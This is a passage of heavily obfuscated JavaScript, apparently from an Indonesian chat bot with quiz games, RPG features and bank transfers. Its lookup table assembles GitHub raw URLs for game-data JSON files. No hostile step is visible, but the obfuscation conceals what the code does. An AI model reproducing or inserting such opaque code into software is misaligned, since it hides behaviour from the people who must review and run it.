_0x46a701*_0x53c030;},'tkhpo':_0x240d04(0x166f),'Rsvji':function(_0x288ce5,_0xdbf783,_0x331479){return _0x288ce5(_0xdbf783,_0x331479);},'uhbfA':function(_0x2abc7a,_0x2a07c8){return _0x2abc7a+_0x2a07c8;},'BDYwh':_0x240d04(0x2bab)+_0x240d04(0x13e)+'..','EZBvx':function(_0x3df0b0,_0x52a05f,_0x587c6d){return _0x3df0b0(_0x52a05f,_0x587c6d);},'MyLvB':_0x240d04(0x12f8),'FSWOH':function(_0x3215ae,_0x5b52df){return _0x3215ae(_0x5b52df);},'VDmrI':_0x240d04(0x231f),'lGZzB':function(_0x19d6b0,_0x1c2720){return _0x19d6b0!==_0x1c2720;},'rVvoP':_0x240d04(0x29b2),'nUGjU':_0x240d04(0xbf),'lxWVT':function(_0x2124e4,_0x337ad7){return _0x2124e4(_0x337ad7);},'tdQxx':_0x240d04(0x206b),'xcUDY':_0x240d04(0x5bd),'VuLgn':_0x240d04(0x17ce),'OCpkb':_0x240d04(0x54a)+_0x240d04(0x1e1b)+_0x240d04(0x1af3)+_0x240d04(0x2953)+_0x240d04(0x2776),'TLeQk':_0x240d04(0x1180),'GGwKM':_0x240d04(0x133f)+_0x240d04(0x212c),'EGsQe':_0x240d04(0x15fb)+_0x240d04(0x29e1)+_0x240d04(0xc55),'wSksN':_0x240d04(0x1b86)+'ur','AmDat':_0x240d04(0x2c5e)+_0x240d04(0x929)+_0x240d04(0x6ca),'mjHfq':'nggak\x20foku'+'s','NvVru':_0x240d04(0x76f)+'i\x20skill','lPzQB':'ditinggal\x20'+'sinyal','ujzGK':function(_0x28f3a6,_0xa3b402){return _0x28f3a6!==_0xa3b402;},'KySys':_0x240d04(0x13a8),'WhKqe':function(_0x59a447){return _0x59a447();},'oXUbb':function(_0xa12324,_0x306dc4){return _0xa12324(_0x306dc4);},'AsgUM':_0x240d04(0xecc)+_0x240d04(0x2763)+_0x240d04(0x11ea)+'n!\x20Tunggu\x20'+_0x240d04(0x91e),'MquJc':function(_0x43bac0,_0x45fc81){return _0x43bac0(_0x45fc81);},'aVwGE':function(_0x56ef98,_0x4948d9){return _0x56ef98(_0x4948d9);},'tNECt':function(_0x4ad1b5,_0x36ac50){return _0x4ad1b5(_0x36ac50);},'VnExA':function(_0x4c89e2,_0x3e2ca7){return _0x4c89e2<_0x3e2ca7;},'ULUGB':function(_0x5af0fe,_0x4bb959){return _0x5af0fe!==_0x4bb959;},'TewQN':_0x240d04(0x29a9),'NaPBO':'ncTiP','HPZGb':function(_0x2ab00b,_0x2ef37c){return _0x2ab00b-_0x2ef37c;},'kmsSZ':'ggnqu','WIZxk':function(_0x348d2b,_0x2646a0){return _0x348d2b*_0x2646a0;},'NMixK':function(_0x16d85c,_0x514966){return _0x16d85c-_0x514966;},'NLdYs':function(_0x4185e8,_0x48b53c){return _0x4185e8(_0x48b53c);},'MeXoz':function(_0x57f0d8,_0x578f79){return _0x57f0d8*_0x578f79;},'GUDcf':function(_0x14b823,_0x422d09){return _0x14b823-_0x422d09;},'nsDBh':function(_0x591b31,_0x20f98a){return _0x591b31*_0x20f98a;},'TfTNJ':function(_0x50c608,_0x4cba85){return _0x50c608(_0x4cba85);},'eaUYL':function(_0x16633a,_0x509938,_0x12757e){return _0x16633a(_0x509938,_0x12757e);},'oaDVk':function(_0x507f11,_0x22afd8){return _0x507f11-_0x22afd8;},'OeqiQ':function(_0x1b959e,_0x45e18d){return _0x1b959e*_0x45e18d;},'VMNEE':function(_0x2f38be,_0x4d532f){return _0x2f38be(_0x4d532f);},'VuSqI':function(_0x49f969,_0x560989){return _0x49f969(_0x560989);},'KFCIc':_0x240d04(0x1b8c),'oiBVa':'wFzXB','SpwnH':_0x240d04(0x1539),'fivwC':function(_0x42dc50,_0x3a3ea4){return _0x42dc50===_0x3a3ea4;},'zUWvO':_0x240d04(0x585),'bPPMn':_0x240d04(0x1af8),'XFYgj':function(_0x54958b,_0x4ea208){return _0x54958b+_0x4ea208;},'tbHIg':function(_0x102c4f,_0x51a8d2){return _0x102c4f>_0x51a8d2;},'pdjVk':function(_0x3f3fd1,_0x4c5ecf){return _0x3f3fd1(_0x4c5ecf);},'uYDpP':_0x240d04(0x541),'fcKDW':_0x240d04(0x2007),'fTVJI':function(_0x44e714,_0x125adb){return _0x44e714(_0x125adb);},'UPUfH':_0x240d04(0x9f8),'DnyGl':_0x240d04(0x1b8a),'CDJvY':_0x240d04(0x5bd)+_0x240d04(0x1ade),'REHHD':_0x240d04(0x109b)+_0x240d04(0xdb1),'NXkwt':_0x240d04(0xd88)+_0x240d04(0x30f),'NAUvR':'armordurab'+'ility','aYbzC':_0x240d04(0x1a9e),'cgsDN':function(_0x1004d5,_0x4c544f){return _0x1004d5(_0x4c544f);},'sDzql':function(_0x5e64aa,_0x1ac38f){return _0x5e64aa===_0x1ac38f;},'DxhSr':function(_0x5b81cf,_0x486e9a){return _0x5b81cf===_0x486e9a;},'LsBCM':_0x240d04(0x1b20),'sNelF':_0x240d04(0x2c86),'FsPWE':function(_0x5a50ea,_0x57f6df){return _0x5a50ea(_0x57f6df);},'SyDiT':function(_0x282627,_0xccd52d){return _0x282627(_0xccd52d);},'hGEHD':function(_0x12987e,_0x4f65f1){return _0x12987e===_0x4f65f1;},'jZCsQ':_0x240d04(0x152),'DDSFX':function(_0x47ecfc,_0x51f2b0){return _0x47ecfc(_0x51f2b0);},'jbhfb':function(_0x1efc1d,_0x24be25){return _0x1efc1d(_0x24be25);},'PAxCS':function(_0x624e42,_0x2ba86b){return _0x624e42(_0x2ba86b);},'ohqNX':'transfer','whzqy':function(_0x1d28b7,_0x1a846f){return _0x1d28b7!==_0x1a846f;},'enEbX':_0x240d04(0x14a),'fSnTS':'Lawoh','DcSrX':'bank','fZBRv':_0x240d04(0xc7e),'mNGAf':_0x240d04(0x29f7),'QIPHX':_0x240d04(0xe62),'XXJra':_0x240d04(0x2a91),'YEmpK':'emerald','oBLXz':_0x240d04(0x1382),'juxWO':'common','XdCRF':_0x240d04(0x15f9),'ParQM':_0x240d04(0xac4),'cBnHy':'bibitanggu'+'r','RsMgM':_0x240d04(0x1d2a)+'g','LxMVK':function(_0x2cff52,_0x2b5c7b){return _0x2cff52<=_0x2b5c7b;},'XkaUH':_0x240d04(0x20d5)+_0x240d04(0x1648)+_0x240d04(0x2166),'Jbsmk':_0x240d04(0x1fcc)+_0x240d04(0x126a)+'gram.\x0aCont'+_0x240d04(0xcda)+_0x240d04(0x258a)+'1000\x2012345'+'6789','STBwt':_0x240d04(0x1dd2)+'tau\x20ketik\x20'+_0x240d04(0x20f7),'jesHe':function(_0x325710,_0x12da68){return _0x325710<_0x12da68;},'vwhBj':function(_0x5c607,_0x475ddc){return _0x5c607+_0x475ddc;},'qXxFt':function(_0x4de6ab,_0x15255a){return _0x4de6ab>_0x15255a;},'yxXKx':'✅\x20Sukses','SPDLo':_0x240d04(0x2e17),'rulZr':function(_0xf33912,_0x2b190e){return _0xf33912(_0x2b190e);},'YxraB':function(_0x1bfd27,_0x347378){return _0x1bfd27(_0x347378);},'XDBQV':_0x240d04(0x197e)+'l','qZLxS':function(_0x2e1ef1,_0x122bf8){return _0x2e1ef1!==_0x122bf8;},'igBjf':function(_0x55e878,_0xbda2bc){return _0x55e878!==_0xbda2bc;},'ykSvu':_0x240d04(0x2c33),'ENjEW':function(_0x10f3b6,_0x2915ce){return _0x10f3b6(_0x2915ce);},'DKixB':'swordmaste'+'r','SFOAX':'witch','KRIDN':_0x240d04(0x2ea8),'yhkwK':_0x240d04(0x1f6a)+_0x240d04(0x1f69),'usTub':'thief','XRKUK':_0x240d04(0x10fe),'EajPB':_0x240d04(0xd45),'wgkNC':function(_0x3a3d50,_0x38fa74){return _0x3a3d50!==_0x38fa74;},'xbrwG':_0x240d04(0x12f),'fFxSg':function(_0x27c24a,_0x3d7bcb){return _0x27c24a===_0x3d7bcb;},'zQrOZ':function(_0x30816c,_0x4af524){return _0x30816c!==_0x4af524;},'fsbOf':_0x240d04(0x1876),'AZZgt':_0x240d04(0xd49),'JnrHj':_0x240d04(0x1cd9),'PDtkT':function(_0x1a9898){return _0x1a9898();},'JePEq':function(_0x1536bb,_0x5f3d3b){return _0x1536bb-_0x5f3d3b;},'YmnLm':_0x240d04(0x1acc),'rAOSN':function(_0x1c27bf,_0x2c6991){return _0x1c27bf*_0x2c6991;},'ccevy':function(_0x5edfa5,_0x22ccde){return _0x5edfa5%_0x22ccde;},'IiSuv':function(_0x1ffd1a,_0x240038){return _0x1ffd1a%_0x240038;},'sfNMU':function(_0x3885bd,_0x50a32b){return _0x3885bd/_0x50a32b;},'TFBUP':'FDjxS','AqzyY':function(_0x364d62,_0x182442){return _0x364d62(_0x182442);},'sANDt':_0x240d04(0x269),'eyEnJ':'HQXTX','hHnOE':function(_0x570e72,_0x521c4f){return _0x570e72-_0x521c4f;},'vWwem':function(_0x22fedf,_0xb6f309){return _0x22fedf-_0xb6f309;},'WNHYT':function(_0x2628e5,_0x232f76){return _0x2628e5(_0x232f76);},'ZoMxt':function(_0x240561,_0x47e5c2){return _0x240561*_0x47e5c2;},'bxutq':'Pengguna','TDAdb':function(_0x1f8b84){return _0x1f8b84();},'RRHiQ':function(_0x2850f3,_0x9aff14){return _0x2850f3(_0x9aff14);},'bYgPP':function(_0x3d5cb9,_0x2a5e3b){return _0x3d5cb9<=_0x2a5e3b;},'TbUPw':function(_0x3b3e99,_0x512906){return _0x3b3e99(_0x512906);},'gDbjV':function(_0x12d84f,_0x1bfc3d){return _0x12d84f<_0x1bfc3d;},'nteOQ':function(_0x3f2a54,_0x50075f){return _0x3f2a54-_0x50075f;},'QtVVu':'❤️\x20Health\x20k'+_0x240d04(0x2ad0)+_0x240d04(0x23d2),'mwzjv':function(_0x2d2280,_0x1919d2){return _0x2d2280(_0x1919d2);},'dRJFb':function(_0x51c828,_0x26be81){return _0x51c828(_0x26be81);},'eaeVS':_0x240d04(0x359),'oaUSP':function(_0x2f303a,_0x290175){return _0x2f303a<_0x290175;},'MyGlP':function(_0x24c152,_0x30bd1d){return _0x24c152(_0x30bd1d);},'GLaeo':_0x240d04(0x2b6d)+_0x240d04(0x2a8c)+'\x2080\x20Health'+'\x20untuk\x20mel'+'akukan\x20aks'+'i\x20perampok'+_0x240d04(0x1546),'hNMoX':function(_0x1d1076,_0x5b8eea){return _0x1d1076<_0x5b8eea;},'QRgYH':function(_0x1afddd,_0x2e2c83){return _0x1afddd-_0x2e2c83;},'vSetJ':function(_0x3eb56f,_0x4ca457){return _0x3eb56f*_0x4ca457;},'nnggx':function(_0x494006,_0x100f2d){return _0x494006*_0x100f2d;},'CagTK':function(_0x23dc2e,_0x1d0876){return _0x23dc2e+_0x1d0876;},'NJMeL':_0x240d04(0x2e23)+_0x240d04(0x944)+_0x240d04(0x1094)+'...','ZXqZw':_0x240d04(0x1e42)+'\x20Memulai\x20a'+_0x240d04(0x3a4),'dMkDh':_0x240d04(0xba2)+_0x240d04(0x27c3)+_0x240d04(0x29ff),'vChmz':function(_0x547e9c,_0x4d0215){return _0x547e9c===_0x4d0215;},'Tzauo':function(_0xda83a3,_0x188f19,_0x481a13){return _0xda83a3(_0x188f19,_0x481a13);},'PZzrY':function(_0x378144,_0x40c228){return _0x378144(_0x40c228);},'DzmWi':function(_0x27e589,_0x258883){return _0x27e589-_0x258883;},'UvXgJ':function(_0x193d99,_0x339117){return _0x193d99-_0x339117;},'qcFcf':function(_0x3967f4,_0x3cb6a6){return _0x3967f4<_0x3cb6a6;},'AuOic':function(_0x4a900b,_0x4db407){return _0x4a900b*_0x4db407;},'xQRUB':function(_0x67e6cc,_0xbc70b8){return _0x67e6cc+_0xbc70b8;},'mywYs':function(_0xd5a72,_0x2d1998){return _0xd5a72+_0x2d1998;},'HLdDO':function(_0x1b7df3,_0x2cfbac){return _0x1b7df3!==_0x2cfbac;},'qlWkS':_0x240d04(0x2680),'yOpDL':_0x240d04(0x2a80),'vgaaB':function(_0x5b33b2,_0x1be7cb,_0x3e9ecd){return _0x5b33b2(_0x1be7cb,_0x3e9ecd);},'rZlGS':function(_0x2b6652,_0x1b28b1){return _0x2b6652(_0x1b28b1);},'PRogj':'Ddhon','kAWkl':function(_0x18b2c8,_0x5ca823){return _0x18b2c8(_0x5ca823);},'SlGMv':function(_0x5473ee,_0x32326c){return _0x5473ee(_0x32326c);},'HACBF':function(_0x14ced7,_0x1c808d){return _0x14ced7+_0x1c808d;},'omFss':function(_0x1960a0,_0xff3d42){return _0x1960a0(_0xff3d42);},'xionj':function(_0x4a922b,_0x205b79){return _0x4a922b-_0x205b79;},'yBKkg':function(_0x7d7fb4,_0x3f5f06){return _0x7d7fb4+_0x3f5f06;},'CmeMG':'UxvXh','cpLYI':_0x240d04(0xf14),'sTPaA':_0x240d04(0xd7d)+'w.githubus'+_0x240d04(0x28b)+_0x240d04(0x2c9e)+_0x240d04(0x1b99)+_0x240d04(0x204f)+'son','JIgCi':_0x240d04(0x1b53)+'ra','IJver':function(_0x3a640a,_0x31037c,_0x6c26e0){return _0x3a640a(_0x31037c,_0x6c26e0);},'SPVji':_0x240d04(0x57a),'wAMGh':_0x240d04(0x9a7),'lLVln':'nKQkQ','uttuQ':'nYNSj','pgxyP':_0x240d04(0x11bb),'KAJUg':_0x240d04(0x13f4),'OyEPN':function(_0x2354f0,_0x4bbbdd){return _0x2354f0(_0x4bbbdd);},'BAuvp':function(_0x1bf6be,_0xa37e7d){return _0x1bf6be(_0xa37e7d);},'Xywue':_0x240d04(0xc63)+_0x240d04(0x6a2)+'akan\x20*hint'+_0x240d04(0x196a)+_0x240d04(0x1cec)+_0x240d04(0x1271)+'untuk\x20meny'+_0x240d04(0x835)+'\x20punya\x2060\x20'+'detik!','GaxYp':_0x240d04(0x12a9),'yrUQp':function(_0x37f7d9,_0x255788){return _0x37f7d9===_0x255788;},'cScTi':_0x240d04(0x2ea0),'izDpG':function(_0x1b5459,_0x48df36){return _0x1b5459(_0x48df36);},'VqBVP':function(_0x14ceed,_0x236dd3){return _0x14ceed(_0x236dd3);},'cMVSD':_0x240d04(0xd7d)+_0x240d04(0x2476)+'ercontent.'+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x1d61)+_0x240d04(0x1484),'WuiUC':_0x240d04(0x7f4)+_0x240d04(0x22d2)+_0x240d04(0x7a3)+'\x20jika\x20kesu'+_0x240d04(0x261c)+_0x240d04(0x2163)+_0x240d04(0x951)+_0x240d04(0xd23)+'punya\x2060\x20d'+_0x240d04(0x530),'kIvCh':function(_0x2781e4,_0x4a4c39,_0x12fd13){return _0x2781e4(_0x4a4c39,_0x12fd13);},'vySUA':_0x240d04(0x2b2f)+'l','jDBpv':function(_0xd6007b,_0x4ba355){return _0xd6007b===_0x4ba355;},'awTyz':'aOYwc','jHtCw':_0x240d04(0x1bfc),'NPWXd':_0x240d04(0xd7d)+'w.githubus'+'ercontent.'+'com/NdikzO'+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x25b1)+'n','mSvEJ':function(_0x247621,_0x3a316c){return _0x247621*_0x3a316c;},'DrxFq':_0x240d04(0x1560)+_0x240d04(0x1e58)+_0x240d04(0x238e)+_0x240d04(0x2973)+_0x240d04(0x1621)+_0x240d04(0x10ac)+'*\x20untuk\x20me'+_0x240d04(0xe39)+'mu\x20punya\x203'+_0x240d04(0x1d7e),'Ohadl':function(_0x1caa98,_0x412c07){return _0x1caa98!==_0x412c07;},'SFNkI':'viraI','lGUow':'mTTcC','MGAUj':_0x240d04(0x249c),'ZzRZa':_0x240d04(0x1954),'SvBBP':function(_0x17a7fd,_0x470efa){return _0x17a7fd(_0x470efa);},'wqEnj':function(_0x9de3d4,_0x12e96b){return _0x9de3d4!==_0x12e96b;},'QJmtf':'OiPaE','YLniK':_0x240d04(0x462),'SKbkR':'eHcUE','yQSWI':function(_0x39b560,_0x250aa3){return _0x39b560(_0x250aa3);},'ncysA':_0x240d04(0xd7d)+_0x240d04(0x2476)+'ercontent.'+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+'fs/heads/m'+_0x240d04(0x12d)+_0x240d04(0x1314),'XyJvZ':_0x240d04(0x888)+_0x240d04(0x1a29)+_0x240d04(0x2891)+_0x240d04(0x196a)+_0x240d04(0x1cec)+_0x240d04(0x1271)+_0x240d04(0x1f26)+_0x240d04(0x835)+_0x240d04(0xdb5)+_0x240d04(0x13f7),'HmhXC':function(_0x54bc75,_0x2ffddf,_0x574589){return _0x54bc75(_0x2ffddf,_0x574589);},'mbEVW':function(_0x472105,_0x408539){return _0x472105!==_0x408539;},'djXLW':_0x240d04(0x27d8),'IrNML':_0x240d04(0x1da3)+'r','ycpSW':function(_0xe82e6){return _0xe82e6();},'sZiCB':'nkBUK','rUguy':function(_0x1d5c53,_0x1fcbf6){return _0x1d5c53(_0x1fcbf6);},'IYWXu':'https://ra'+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x1d61)+_0x240d04(0x141f),'lidDp':function(_0x2774a8,_0x3645e3){return _0x2774a8*_0x3645e3;},'fRQow':_0x240d04(0x936)+'r','RYYmR':function(_0x245531,_0x40e956,_0x59472f){return _0x245531(_0x40e956,_0x59472f);},'Zaluv':function(_0x5c758d,_0x1827f8){return _0x5c758d===_0x1827f8;},'BrQKL':_0x240d04(0x18e8),'zepyn':_0x240d04(0x25d)+'limat','ZOLZW':function(_0x13d549,_0x322a54){return _0x13d549!==_0x322a54;},'FbwXk':'mmekE','pYTOh':'QYvdH','lUypv':'ZmPgc','XzIbD':function(_0x483864,_0x4c3d97){return _0x483864(_0x4c3d97);},'TfzXr':function(_0x52684a){return _0x52684a();},'FCLZv':function(_0x359dfb,_0x174e7b){return _0x359dfb!==_0x174e7b;},'lvuAx':_0x240d04(0x1d89),'tYmBf':function(_0x3078e1,_0x21245f){return _0x3078e1(_0x21245f);},'hvEhf':_0x240d04(0x298),'RFNDv':function(_0x5a2164,_0x57e187){return _0x5a2164(_0x57e187);},'FCUcC':function(_0x368000,_0x4d8cec,_0x5e395c){return _0x368000(_0x4d8cec,_0x5e395c);},'Hcjnn':function(_0x1dbdfd,_0x270463,_0x1a9142){return _0x1dbdfd(_0x270463,_0x1a9142);},'yXRKI':function(_0x5598ee,_0xad7096){return _0x5598ee(_0xad7096);},'rASfK':_0x240d04(0xe28)+'u','KXLCc':function(_0x42cb71,_0xea04e){return _0x42cb71!==_0xea04e;},'ekoPG':'QApuB','ZpLfz':function(_0xb4e08e,_0x29ec19){return _0xb4e08e!==_0x29ec19;},'RPEoj':_0x240d04(0x2d77),'ChnRy':'lOokv','fIpmg':function(_0x24ff0e,_0x54a290){return _0x24ff0e(_0x54a290);},'AtdZA':function(_0x2e9427,_0xb5a47a){return _0x2e9427(_0xb5a47a);},'IgvwC':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+'fs/heads/m'+'ain/siapak'+_0x240d04(0x2c1c),'zCnsG':function(_0x389b49,_0xc79eb5,_0x1dc37d){return _0x389b49(_0xc79eb5,_0x1dc37d);},'sqJtx':_0x240d04(0x7fe),'vWVrz':function(_0x457cde,_0x2ab84c){return _0x457cde===_0x2ab84c;},'iiBuU':_0x240d04(0x1396),'aABNd':function(_0x2c77ab,_0x26bb04){return _0x2c77ab===_0x26bb04;},'wmNDk':_0x240d04(0x209b),'BGHdN':function(_0x258604,_0x4b7fc0){return _0x258604(_0x4b7fc0);},'Cfqqr':'https://ra'+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x1552)+_0x240d04(0x169d),'jmcRF':_0x240d04(0x1730),'DnvWx':_0x240d04(0x1fba),'QRQrD':_0x240d04(0x24d4),'FVGQv':_0x240d04(0x1424),'bTPyh':'aOUNU','DbyLH':function(_0xe3a95d,_0x5d3f5b){return _0xe3a95d(_0x5d3f5b);},'IYUoo':function(_0x477f64,_0x45d397){return _0x477f64(_0x45d397);},'wtKPx':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+'com/Bochil'+_0x240d04(0xbcc)+_0x240d04(0x1cbc)+_0x240d04(0x2813)+_0x240d04(0x2262),'ZtJlC':function(_0x5baa0f,_0x3a57f5){return _0x5baa0f===_0x3a57f5;},'ylPWb':_0x240d04(0x17df),'wVatc':_0x240d04(0x1373),'wiZWf':_0x240d04(0x2e37),'HQZlQ':function(_0x10c3e1,_0x183833){return _0x10c3e1(_0x183833);},'CGbXB':function(_0x4f776b,_0x4397c4){return _0x4f776b===_0x4397c4;},'sgztq':'jsynU','rRhpq':_0x240d04(0x2781),'cCEAk':function(_0x1a9a00,_0x5726a3){return _0x1a9a00(_0x5726a3);},'kxYXx':function(_0x222c95,_0x1108bb){return _0x222c95(_0x1108bb);},'vSCze':function(_0x3e6282,_0x2c4e47){return _0x3e6282(_0x2c4e47);},'jyHVv':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x3f4)+_0x240d04(0xbcc)+'ase/master'+'/games/cak'+'lontong.js'+'on','cCnqJ':function(_0x4c932d,_0x1e2eda){return _0x4c932d*_0x1e2eda;},'LMMAR':function(_0x30b586,_0x14ce90,_0xd31b4a){return _0x30b586(_0x14ce90,_0xd31b4a);},'oSQSt':'tebakkata','ciCyq':function(_0x175334,_0x572bd2){return _0x175334===_0x572bd2;},'zKJDu':_0x240d04(0x2922),'XkfVN':_0x240d04(0x250),'MeIzl':'LZRDa','gjYaw':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x17b9)+_0x240d04(0x169d),'gvwnA':function(_0x696d1a,_0x184bd7,_0x5896ca){return _0x696d1a(_0x184bd7,_0x5896ca);},'wwkqK':function(_0x25dd11,_0xc898a1,_0x14af14){return _0x25dd11(_0xc898a1,_0x14af14);},'xziEk':function(_0x55f710,_0x12533f){return _0x55f710!==_0x12533f;},'UDcwm':function(_0x3dca9f,_0x3b161a){return _0x3dca9f(_0x3b161a);},'JQjJO':_0x240d04(0x14db),'heJOY':function(_0x27edd1,_0x543725){return _0x27edd1(_0x543725);},'KsAdn':function(_0x2308ce,_0x4c5b82){return _0x2308ce===_0x4c5b82;},'LpNQb':_0x240d04(0x17e0),'NUOUL':function(_0xe54ba4,_0x2eb98f){return _0xe54ba4(_0x2eb98f);},'iORks':_0x240d04(0x1d79),'yteBY':_0x240d04(0x2732),'vJZht':_0x240d04(0xd7d)+'w.githubus'+'ercontent.'+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+'ain/tebakk'+_0x240d04(0x23b0),'epNcR':_0x240d04(0x2a1b),'tHGDW':function(_0x135707,_0x18069e,_0x104331){return _0x135707(_0x18069e,_0x104331);},'bfJcz':'tebaklagu','nVBsQ':function(_0x3e2057){return _0x3e2057();},'KFnGE':_0x240d04(0x503),'gicaq':function(_0x5cfc63,_0x28f28e){return _0x5cfc63!==_0x28f28e;},'Xgcxj':'nrpiz','PKCTa':_0x240d04(0xd7d)+_0x240d04(0x2476)+'ercontent.'+_0x240d04(0xb84)+_0x240d04(0x178e)+_0x240d04(0x446)+'gu.json','ttHjL':function(_0xaa7b8e,_0x4a49ad){return _0xaa7b8e*_0x4a49ad;},'UBVpX':_0x240d04(0xb54)+'.mp3','BiAwP':function(_0x4bf11e,_0xe85444,_0x46f380){return _0x4bf11e(_0xe85444,_0x46f380);},'XFIYR':function(_0x4103ba,_0x16f4ee,_0x570616){return _0x4103ba(_0x16f4ee,_0x570616);},'Rzrra':_0x240d04(0x92f),'zjvDs':function(_0x5d8195){return _0x5d8195();},'SmtFl':function(_0x331cd0,_0x5bf14a){return _0x331cd0(_0x5bf14a);},'POoOs':function(_0x5c9745,_0x3fc12a,_0x826fff){return _0x5c9745(_0x3fc12a,_0x826fff);},'JOzKw':function(_0x34ea40,_0x36e860){return _0x34ea40===_0x36e860;},'KEXEh':_0x240d04(0xfa7),'AcBic':function(_0x1c4742,_0x3b9b4e){return _0x1c4742(_0x3b9b4e);},'dNWnq':'tebaktebak'+'an','Jnugp':'JetmN','smabk':_0x240d04(0x2846),'odzJg':function(_0x2d1521,_0x19498c){return _0x2d1521(_0x19498c);},'GAyPA':function(_0xf70ee4,_0x307bf8){return _0xf70ee4(_0x307bf8);},'ZkJBE':function(_0x417bda,_0x4f8c71){return _0x417bda!==_0x4f8c71;},'DoDpe':'Cwlkd','WkrUz':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x2c1d)+_0x240d04(0x122)+'n','xAVhi':function(_0x39dacb,_0x41b272){return _0x39dacb*_0x41b272;},'ICCnj':_0x240d04(0x1c8a),'ViuDc':_0x240d04(0x2e0f),'phbCN':'sJHyr','dqteO':_0x240d04(0x2cb6),'aTqnR':_0x240d04(0x1538),'vxJEj':function(_0x18aa08,_0x1d49b1){return _0x18aa08(_0x1d49b1);},'bfTEw':_0x240d04(0x1761),'VWvyZ':_0x240d04(0x1d50),'SWJqm':function(_0x57370f,_0x3bff35){return _0x57370f(_0x3bff35);},'pClQk':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x2605)+_0x240d04(0x1181),'KMrNb':function(_0x4e82ab,_0x5d62f5){return _0x4e82ab*_0x5d62f5;},'KwDNG':function(_0x59751c,_0x254995,_0x169f78){return _0x59751c(_0x254995,_0x169f78);},'RHgtx':'hrGJA','tFasf':function(_0x1d211,_0x245dac){return _0x1d211!==_0x245dac;},'aUZFl':'WDcWL','qAiGT':_0x240d04(0x24b0),'WEnxs':_0x240d04(0xfe6),'tKoGI':_0x240d04(0x22b8),'SiHEw':function(_0x1eb311,_0x35756a){return _0x1eb311(_0x35756a);},'LrEXH':_0x240d04(0xd7d)+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+_0x240d04(0x1c3f)+_0x240d04(0x11c7)+_0x240d04(0x2448)+'nime.json','ZACUW':function(_0x105129,_0x22f718){return _0x105129*_0x22f718;},'tkrnF':_0x240d04(0x222),'iXNgE':function(_0x5dd52c,_0x133064){return _0x5dd52c(_0x133064);},'DmSPw':function(_0xbd9489,_0x31fe7a){return _0xbd9489(_0x31fe7a);},'ylYZu':'https://ra'+_0x240d04(0x2476)+_0x240d04(0x28b)+_0x240d04(0x28ae)+'ne/Game/re'+_0x240d04(0x11c7)+_0x240d04(0x4a7)+'100.json','VPfRk':function(_0x164860,_0x162f82){return _0x164860===_0x162f82;},'ZvQhz':function(_0x10951b,_0x698816){return _0x10951b(_0x698816);},'pbczU':function(_0x3a3793,_0x2dc731){return _0x3a3793(_0x2dc731);},'bLxVP':'hint','zRoZc':function(_0x37df47,_0xc4702a){return _0x37df47(_0xc4702a);},'AsXHw':'Hint\x20sudah'+_0x240d04(0x2c2a)+'.','qajxc':function(_0x560bf3,_0x558dea){return _0x560bf3(_0x558dea);},'OHXRR':_0x240d04(0x1132),'iVjvs':function(_0x3eae55,_0x57b079){return _0x3eae55(_0x57b079);},'cBCED':_0x240d04(0x1402),'fZBlx':_0x240d04(0x219b),'vydyC':function(_0x1a0705,_0x36d8b0){return _0x1a0705(_0x36d8b0);},'pvrSX':_0x240d04(0x19b)+_0x240d04(0x13d6)+'.','sxUMg':function(_0x2c2ec9,_0x51495e){return _0x2c2ec9(_0x51495e);},'vNrPh':function(_0x2aea60,_0x4b6020){return _0x2aea60(_0x4b6020);},'prSjd':function(_0x1cc878,_0x4c7bd8){return _0x1cc878(_0x4c7bd8);},'SiFsA':_0x240d04(0x248f),'uIBqG':_0x240d04(0x2439),'qzFQi':_0x240d04(0x624),'SdojA':'6️⃣','Ietxd':'7️⃣','yAcxt':_0x240d04(0x913),'DwTLR':function(_0x27966c,_0x3da910){return _0x27966c+_0x3da910;},'bjKBx':function(_0x230964,_0x40ea39){return _0x230964(_0x40ea39);},'SQgSS':function(_0x135db7,_0x1e371c,_0x3cd050){return _0x135db7(_0x1e371c,_0x3cd050);},'hpCYf':_0x240d04(0x26fd),'hyatX':_0x240d04(0x321),'LDIHD':_0x240d04(0xfb0),'gqBTA':function(_0x1949ac,_0x5ab4c0){return _0x1949ac in _0x5ab4c0;},'EzWAO':function(_0x5b5a55,_0x384302){return _0x5b5a55(_0x384302);},'nsvHv':function(_0x5c7276,_0x5a950d,_0x210de7,_0x49d885){return _0x5c7276(_0x5a950d,_0x210de7,_0x49d885);},'CzLrU':function(_0x5429d9,_0x337923){return _0x5429d9(_0x337923);},'IMmlB':'daftar','bLXSe':function(_0x3a5de3){return _0x3a5de3();},'OzKlM':'CReQB','UvvXS':function(_0x19b1ec,_0x441093){return _0x19b1ec(_0x441093);},'yWOEi':function(_0x60e8ff,_0x485b6e){return _0x60e8ff(_0x485b6e);},'SDgmq':_0x240d04(0x1a4f)+_0x240d04(0x2d16)+_0x240d04(0x23a2)+_0x240d04(0x465),'vFaXK':function(_0x480b18,_0x4a1560){return _0x480b18<_0x4a1560;},'xKxtv':_0x240d04(0x180f)+_0x240d04(0x13f2)+_0x240d04(0x782),'dflZv':function(_0x1c8995,_0x36147e){return _0x1c8995+_0x36147e;},'kOYrL':function(_0x237288,_0x41d9ca){return 